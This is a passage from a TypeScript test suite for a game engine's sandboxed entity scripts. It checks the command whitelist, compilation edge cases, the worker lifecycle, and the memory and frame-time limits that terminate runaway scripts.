    const hooks = compileSandboxed(`
      function onStart() {
        try { forge.physics = { applyForce: function() {} }; } catch (_e) {}
        forge.physics.applyForce(0, 10, 0);
      }
    `, frozenForge);
    hooks.onStart!();
    expect(originalCalled).toBe(true);
  });

  it('accessing nonexistent sub-API throws inside script, not during compilation', () => {
    const hooks = compileSandboxed(`
      let threw = false;
      function onStart() {
        try { forge.doesNotExist.method(); }
        catch (_e) { threw = true; }
      }
    `);
    expect(hooks.onStart).toBeTypeOf('function');
    expect(() => hooks.onStart!()).not.toThrow();
  });
});

// ---------------------------------------------------------------------------
// 10. Command payload structure
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Command Payload Structure', () => {
  it('all forge-generated commands have string cmd fields on the whitelist', () => {
    const commands: { cmd: string; [key: string]: unknown }[] = [];
    const forge = {
      setPosition: (eid: string, x: number, y: number, z: number) =>
        commands.push({ cmd: 'update_transform', entityId: eid, position: [x, y, z] }),
      applyForce: (eid: string, fx: number, fy: number, fz: number) =>
        commands.push({ cmd: 'apply_force', entityId: eid, force: [fx, fy, fz], isImpulse: false }),
      playAudio: (eid: string) =>
        commands.push({ cmd: 'play_audio', entityId: eid }),
    };

    const hooks = compileSandboxed(`
      function onStart() {
        forge.setPosition('e1', 1, 2, 3);
        forge.applyForce('e1', 0, -9.8, 0);
        forge.playAudio('sfx1');
      }
    `, forge);
    hooks.onStart!();

    for (const cmd of commands) {
      expect(typeof cmd.cmd).toBe('string');
      expect(SCRIPT_ALLOWED_COMMANDS.has(cmd.cmd)).toBe(true);
    }
  });

  it('rejects commands with non-string cmd values from whitelist check', () => {
    const badValues = [42, null, undefined, ['update_transform'], { name: 'update_transform' }];
    for (const v of badValues) {
      expect(typeof v === 'string' && SCRIPT_ALLOWED_COMMANDS.has(v as string)).toBe(false);
    }
  });

  it('update_transform command has the correct payload shape', () => {
    const commands: { cmd: string; entityId?: string; position?: number[] }[] = [];
    const hooks = compileSandboxed(`
      function onStart() { forge.setPosition('hero', 5, 0, -3); }
    `, {
      setPosition: (eid: string, x: number, y: number, z: number) =>
        commands.push({ cmd: 'update_transform', entityId: eid, position: [x, y, z] }),
    });
    hooks.onStart!();

    expect(commands).toHaveLength(1);
    expect(commands[0].cmd).toBe('update_transform');
    expect(commands[0].entityId).toBe('hero');
    expect(commands[0].position).toEqual([5, 0, -3]);
  });
});

// ---------------------------------------------------------------------------
// 11. Edge cases
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Edge Cases', () => {
  it('handles a script with only comments', () => {
    const hooks = compileSandboxed(`
      // This script has no functions
      /* Just comments */
    `);
    expect(hooks.onStart).toBeUndefined();
    expect(hooks.onUpdate).toBeUndefined();
  });

  it('handles a script with deeply nested closures', () => {
    let reached = false;
    const hooks = compileSandboxed(`
      function onStart() {
        function outer() {
          function inner() {
            function deepest() { forge.signal(); }
            deepest();
          }
          inner();
        }
        outer();
      }
    `, { signal: () => { reached = true; } });
    hooks.onStart!();
    expect(reached).toBe(true);
  });

  it('handles a script with arrow functions', () => {
    let received = -1;
    const hooks = compileSandboxed(`
      const compute = (x) => x * 2;
      function onStart() { forge.set(compute(5)); }
    `, { set: (v: number) => { received = v; } });
    hooks.onStart!();
    expect(received).toBe(10);
  });

  it('handles scripts with async function declarations', () => {
    // Async functions compile fine; the sandbox does not await them
    const hooks = compileSandboxed(`
      async function onStart() {}
    `);
    expect(hooks.onStart).toBeTypeOf('function');
  });

  it('handles very long scripts without crashing the compiler', () => {
    const manyLines = Array.from({ length: 500 }, (_, i) => `const _v${i} = ${i};`).join('\n');
    const hooks = compileSandboxed(`
      ${manyLines}
      function onStart() {}
    `);
    expect(hooks.onStart).toBeTypeOf('function');
  });

  it('handles scripts with template literals', () => {
    let msg = '';
    const hooks = compileSandboxed(`
      function onStart() {
        const name = 'world';
        forge.log(\`hello \${name}\`);
      }
    `, { log: (m: string) => { msg = m; } });
    hooks.onStart!();
    expect(msg).toBe('hello world');
  });

  it('handles scripts with destructuring assignment', () => {
    const results: number[] = [];
    const hooks = compileSandboxed(`
      function onStart() {
        const [a, b, c] = [1, 2, 3];
        const { x, y } = { x: 10, y: 20 };
        forge.report(a + b + c + x + y);
      }
    `, { report: (v: number) => results.push(v) });
    hooks.onStart!();
    expect(results).toEqual([36]);
  });

  it('handles scripts with spread operator', () => {
    let sum = 0;
    const hooks = compileSandboxed(`
      function onStart() {
        const nums = [1, 2, 3];
        const extended = [...nums, 4, 5];
        forge.report(extended.reduce((a, b) => a + b, 0));
      }
    `, { report: (v: number) => { sum = v; } });
    hooks.onStart!();
    expect(sum).toBe(15);
  });
});

// ---------------------------------------------------------------------------
// 12. Worker integration: complete security flow
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Full Worker Security Flow', () => {
  beforeEach(async () => {
    postedMessages = [];
    workerOnMessage = null;
    vi.resetModules();

    const mockSelf = {
      postMessage: (msg: Record<string, unknown>) => {
        postedMessages.push(structuredClone(msg));
      },
      onmessage: null as ((e: { data: Record<string, unknown> }) => void) | null,
    };
    vi.stubGlobal('self', mockSelf);

    await import('../scriptWorker');
    workerOnMessage = mockSelf.onmessage;
  });

  it('disabled scripts are never executed and produce no output', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'disabled',
        enabled: false,
        source: `function onStart() { forge.log('should not run'); }`,
      }],
      entities: {},
      entityInfos: {},
    });

    expect(getMessages('log')).toHaveLength(0);
    expect(getMessages('error')).toHaveLength(0);
    expect(getMessages('commands')).toHaveLength(0);
  });

  it('compilation errors emit error messages without crashing the worker', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'broken',
        enabled: true,
        source: `function onStart( {  // syntax error`,
      }],
      entities: {},
      entityInfos: {},
    });

    const errors = getMessages('error');
    expect(errors.length).toBeGreaterThanOrEqual(1);
    expect(errors[0].entityId).toBe('broken');
    expect(errors[0].message as string).toContain('Compilation error');
  });

  it('a broken script does not prevent a subsequent good script from running', () => {
    sendToWorker({
      type: 'init',
      scripts: [
        {
          entityId: 'broken',
          enabled: true,
          source: `function onStart( { // syntax error`,
        },
        {
          entityId: 'good',
          enabled: true,
          source: `function onStart() { forge.log('good ran'); }`,
        },
      ],
      entities: {},
      entityInfos: {},
    });

    const logs = getMessages('log');
    const goodLog = logs.find(l => l.message === 'good ran');
    expect(goodLog).toBeDefined();
  });

  it('stop message clears all scripts so subsequent ticks produce no output', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'runner',
        enabled: true,
        source: `function onUpdate() { forge.log('tick'); }`,
      }],
      entities: {},
      entityInfos: {},
    });
    clearMessages();

    sendToWorker({ type: 'stop' });
    clearMessages();

    sendToWorker({ type: 'tick', dt: 0.016, elapsed: 0.016, entities: {} });

    expect(getMessages('log')).toHaveLength(0);
    expect(getMessages('commands')).toHaveLength(0);
  });

  it('re-initializing clears shared state from previous session', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'e1',
        enabled: true,
        source: `function onStart() { forge.state.set('x', 99); }`,
      }],
      entities: {},
      entityInfos: {},
    });
    clearMessages();

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'e2',
        enabled: true,
        source: `function onStart() { forge.log('x=' + forge.state.get('x')); }`,
      }],
      entities: {},
      entityInfos: {},
    });

    const logs = getMessages('log');
    const stateLog = logs.find(l => typeof l.message === 'string' && l.message.startsWith('x='));
    expect(stateLog).toBeDefined();
    // After re-init the shared state is reset; x is undefined
    expect(stateLog!.message as string).toBe('x=undefined');
  });

  it('collision callbacks are cleared after stop', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'ent',
        enabled: true,
        source: `
          function onStart() {
            forge.physics.onCollisionEnter('ent', (other) => forge.log('hit: ' + other));
          }
        `,
      }],
      entities: { ent: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { ent: { name: 'Ent', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    sendToWorker({ type: 'stop' });
    clearMessages();

    sendToWorker({ type: 'COLLISION_EVENT', entityA: 'ent', entityB: 'other', started: true });

    expect(getMessages('log')).toHaveLength(0);
  });

  it('multiple scripts share state through forge.state within the same session', () => {
    sendToWorker({
      type: 'init',
      scripts: [
        {
          entityId: 'writer',
          enabled: true,
          source: `function onStart() { forge.state.set('score', 42); }`,
        },
        {
          entityId: 'reader',
          enabled: true,
          source: `function onStart() { forge.log('score=' + forge.state.get('score')); }`,
        },
      ],
      entities: {},
      entityInfos: {},
    });

    const logs = getMessages('log');
    const scoreLog = logs.find(l => typeof l.message === 'string' && l.message.includes('score='));
    expect(scoreLog).toBeDefined();
    expect(scoreLog!.message as string).toBe('score=42');
  });

  it('onDestroy is called for all scripts on stop, including those that log', () => {
    sendToWorker({
      type: 'init',
      scripts: [
        {
          entityId: 'a',
          enabled: true,
          source: `function onDestroy() { forge.log('a destroyed'); }`,
        },
        {
          entityId: 'b',
          enabled: true,
          source: `function onDestroy() { forge.log('b destroyed'); }`,
        },
      ],
      entities: {},
      entityInfos: {},
    });
    clearMessages();

    sendToWorker({ type: 'stop' });

    const logs = getMessages('log');
    const aLog = logs.find(l => l.message === 'a destroyed');
    const bLog = logs.find(l => l.message === 'b destroyed');
    expect(aLog).toBeDefined();
    expect(bLog).toBeDefined();
  });

  it('onDestroy error does not prevent UI clear message from being sent', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'crasher',
        enabled: true,
        source: `function onDestroy() { throw new Error('destroy crash'); }`,
      }],
      entities: {},
      entityInfos: {},
    });
    clearMessages();

    sendToWorker({ type: 'stop' });

    // Error should be reported
    const errors = getMessages('error');
    expect(errors.length).toBeGreaterThanOrEqual(1);
    expect(errors[0].message as string).toContain('destroy crash');

    // UI clear should still be sent despite the error
    const uiMsgs = getMessages('ui');
    expect(uiMsgs.length).toBeGreaterThanOrEqual(1);
    const clearMsg = uiMsgs.find(m => Array.isArray(m.elements) && (m.elements as unknown[]).length === 0);
    expect(clearMsg).toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// 13. Memory limit detection
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Memory Limit Detection', () => {
  let mockSelf: {
    postMessage: (msg: Record<string, unknown>) => void;
    onmessage: ((e: { data: Record<string, unknown> }) => void) | null;
  };

  beforeEach(async () => {
    postedMessages = [];
    workerOnMessage = null;
    vi.resetModules();

    mockSelf = {
      postMessage: (msg: Record<string, unknown>) => {
        postedMessages.push(structuredClone(msg));
      },
      onmessage: null,
    };
    vi.stubGlobal('self', mockSelf);

    await import('../scriptWorker');
    workerOnMessage = mockSelf.onmessage;
  });

  it('terminates scripts when heap usage exceeds the configured limit', () => {
    // Set a very low memory limit (1 MB) so even normal execution triggers it
    sendToWorker({ type: 'set_limits', memoryLimitMb: 1 });

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'mem-hog',
        enabled: true,
        source: `function onUpdate() { forge.log('tick'); }`,
      }],
      entities: { 'mem-hog': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { 'mem-hog': { name: 'MemHog', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    // Stub performance.memory to return a heap exceeding our 1 MB limit
    const originalPerformance = (globalThis as Record<string, unknown>).performance;
    vi.stubGlobal('performance', {
      now: () => 0,
      memory: { usedJSHeapSize: 2 * 1024 * 1024 }, // 2 MB
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { 'mem-hog': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    // Restore performance
    vi.stubGlobal('performance', originalPerformance);

    const errors = getMessages('error');
    const memError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('memory limit exceeded'),
    );
    expect(memError).toBeDefined();
  });

  it('memory error message includes heap usage and limit', () => {
    sendToWorker({ type: 'set_limits', memoryLimitMb: 1 });

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'mem-hog',
        enabled: true,
        source: `function onUpdate() {}`,
      }],
      entities: { 'mem-hog': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { 'mem-hog': { name: 'MemHog', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    const originalPerformance = (globalThis as Record<string, unknown>).performance;
    vi.stubGlobal('performance', {
      now: () => 0,
      memory: { usedJSHeapSize: 75 * 1024 * 1024 }, // 75 MB
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { 'mem-hog': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    vi.stubGlobal('performance', originalPerformance);

    const errors = getMessages('error');
    const memError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('memory limit exceeded'),
    );
    expect(memError).toBeDefined();
    // Message should contain both "MB" references (usage + limit)
    const msgText = memError!.message as string;
    expect(msgText).toContain('MB');
    expect(msgText).toContain('limit');
  });

  it('does not terminate scripts when heap is within limit', () => {
    sendToWorker({ type: 'set_limits', memoryLimitMb: 100 });

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'fine',
        enabled: true,
        source: `function onUpdate() { forge.log('running'); }`,
      }],
      entities: { fine: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { fine: { name: 'Fine', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    const originalPerformance = (globalThis as Record<string, unknown>).performance;
    vi.stubGlobal('performance', {
      now: () => 0,
      memory: { usedJSHeapSize: 10 * 1024 * 1024 }, // 10 MB (well within 100 MB)
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { fine: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    vi.stubGlobal('performance', originalPerformance);

    const errors = getMessages('error');
    const memError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('memory limit exceeded'),
    );
    expect(memError).toBeUndefined();

    const logs = getMessages('log');
    expect(logs.find(l => l.message === 'running')).toBeDefined();
  });

  it('memory limit is configurable via set_limits message', () => {
    // Default is 50 MB; override to 200 MB and verify it is accepted
    sendToWorker({ type: 'set_limits', memoryLimitMb: 200 });

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'cfg',
        enabled: true,
        source: `function onUpdate() { forge.log('ok'); }`,
      }],
      entities: { cfg: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { cfg: { name: 'Cfg', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    const originalPerformance = (globalThis as Record<string, unknown>).performance;
    vi.stubGlobal('performance', {
      now: () => 0,
      // 100 MB — would trigger default 50 MB limit, but NOT the overridden 200 MB limit
      memory: { usedJSHeapSize: 100 * 1024 * 1024 },
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { cfg: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    vi.stubGlobal('performance', originalPerformance);

    const errors = getMessages('error');
    const memError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('memory limit exceeded'),
    );
    // Should NOT have triggered because 100 MB < 200 MB custom limit
    expect(memError).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// 14. Frame time limit detection
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Frame Time Limit Detection', () => {
  let mockNow: number;

  beforeEach(async () => {
    postedMessages = [];
    workerOnMessage = null;
    mockNow = 0;
    vi.resetModules();

    const mockSelf = {
      postMessage: (msg: Record<string, unknown>) => {
        postedMessages.push(structuredClone(msg));
      },
      onmessage: null as ((e: { data: Record<string, unknown> }) => void) | null,
    };
    vi.stubGlobal('self', mockSelf);

    // Stub performance.now so we can control elapsed time
    vi.stubGlobal('performance', {
      now: () => mockNow,
      memory: undefined,
    });

    await import('../scriptWorker');
    workerOnMessage = mockSelf.onmessage;
  });

  it('terminates a script that exceeds the frame time limit and emits an error', () => {
    // Set a 10ms termination limit
    sendToWorker({ type: 'set_limits', frameTimeLimitMs: 10, frameTimeWarnMs: 5 });

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'slow',
        enabled: true,
        source: `function onUpdate(_dt) {}`,
      }],
      entities: { slow: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { slow: { name: 'Slow', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    // Simulate a slow frame: performance.now() returns 0 when the script starts,
    // then 20ms when we check after — well over the 10ms limit.
    let callCount = 0;
    vi.stubGlobal('performance', {
      now: () => {
        // First call: frame start time (0ms); second call: elapsed check (20ms)
        return callCount++ === 0 ? 0 : 20;
      },
      memory: undefined,
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { slow: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    const errors = getMessages('error');
    const timeError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('frame time limit exceeded'),
    );
    expect(timeError).toBeDefined();
  });

  it('frame time error message includes elapsed ms and entity id', () => {
    sendToWorker({ type: 'set_limits', frameTimeLimitMs: 10, frameTimeWarnMs: 5 });

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'slow-entity',
        enabled: true,
        source: `function onUpdate(_dt) {}`,
      }],
      entities: { 'slow-entity': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { 'slow-entity': { name: 'SlowEntity', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    let callCount = 0;
    vi.stubGlobal('performance', {
      now: () => callCount++ === 0 ? 0 : 50,
      memory: undefined,
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { 'slow-entity': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    const errors = getMessages('error');
    const timeError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('frame time limit exceeded'),
    );
    expect(timeError).toBeDefined();
    expect(timeError!.message as string).toContain('slow-entity');
    expect(timeError!.message as string).toContain('ms');
  });

  it('emits a warn-level log when frame time exceeds warn threshold but not limit', () => {
    sendToWorker({ type: 'set_limits', frameTimeLimitMs: 100, frameTimeWarnMs: 10 });

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'slightly-slow',
        enabled: true,
        source: `function onUpdate(_dt) {}`,
      }],
      entities: { 'slightly-slow': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { 'slightly-slow': { name: 'SlightlySlow', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    let callCount = 0;
    vi.stubGlobal('performance', {
      // Returns 20ms elapsed — above 10ms warn threshold, below 100ms limit
      now: () => callCount++ === 0 ? 0 : 20,
      memory: undefined,
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { 'slightly-slow': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    const errors = getMessages('error');
    const timeError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('frame time limit exceeded'),
    );
    // Should NOT have terminated
    expect(timeError).toBeUndefined();

    const logs = getMessages('log');
    const warnLog = logs.find(l =>
      l.level === 'warn' && typeof l.message === 'string' && l.message.includes('ms'),
    );
    expect(warnLog).toBeDefined();
  });

  it('does not warn or error for a fast frame', () => {
    sendToWorker({ type: 'set_limits', frameTimeLimitMs: 100, frameTimeWarnMs: 16 });

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'fast',
        enabled: true,
        source: `function onUpdate(_dt) {}`,
      }],
      entities: { fast: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { fast: { name: 'Fast', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    // 1ms elapsed — well within both thresholds
    let callCount = 0;
    vi.stubGlobal('performance', {
      now: () => callCount++ === 0 ? 0 : 1,
      memory: undefined,
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { fast: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    const errors = getMessages('error');
    const timeError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('frame time'),
    );
    expect(timeError).toBeUndefined();

    const logs = getMessages('log');
    const warnLog = logs.find(l =>
      l.level === 'warn' && typeof l.message === 'string' && l.message.includes('ms'),
    );
    expect(warnLog).toBeUndefined();
  });

  it('terminated script is removed so subsequent ticks do not run it', () => {
    sendToWorker({ type: 'set_limits', frameTimeLimitMs: 10, frameTimeWarnMs: 5 });

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'to-remove',
        enabled: true,
        source: `function onUpdate(_dt) { forge.log('alive'); }`,
      }],
      entities: { 'to-remove': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { 'to-remove': { name: 'ToRemove', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    // Tick 1: slow — exceeds limit, script is removed
    let call1Count = 0;
    vi.stubGlobal('performance', {
      now: () => call1Count++ === 0 ? 0 : 50,
      memory: undefined,
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { 'to-remove': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });
    clearMessages();

    // Tick 2: normal speed — script should be gone, no log
    vi.stubGlobal('performance', {
      now: () => 0,
      memory: undefined,
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.032,
      entities: { 'to-remove': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    // No 'alive' log — script was terminated after tick 1
    expect(getMessages('log').find(l => l.message === 'alive')).toBeUndefined();
  });

  it('frame time limits are configurable via set_limits', () => {
    // Override both thresholds
    sendToWorker({ type: 'set_limits', frameTimeLimitMs: 200, frameTimeWarnMs: 50 });

    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'configurable',
        enabled: true,
        source: `function onUpdate(_dt) {}`,
      }],
      entities: { configurable: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { configurable: { name: 'Configurable', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    // 30ms elapsed — would warn at default 16ms, but not at our 50ms threshold
    let callCount = 0;
    vi.stubGlobal('performance', {
      now: () => callCount++ === 0 ? 0 : 30,
      memory: undefined,
    });

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { configurable: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    const errors = getMessages('error');
    expect(errors.find(e =>
      typeof e.message === 'string' && e.message.includes('frame time'),
    )).toBeUndefined();

    const logs = getMessages('log');
    expect(logs.find(l =>
      l.level === 'warn' && typeof l.message === 'string' && l.message.includes('ms'),
    )).toBeUndefined();
  });
});
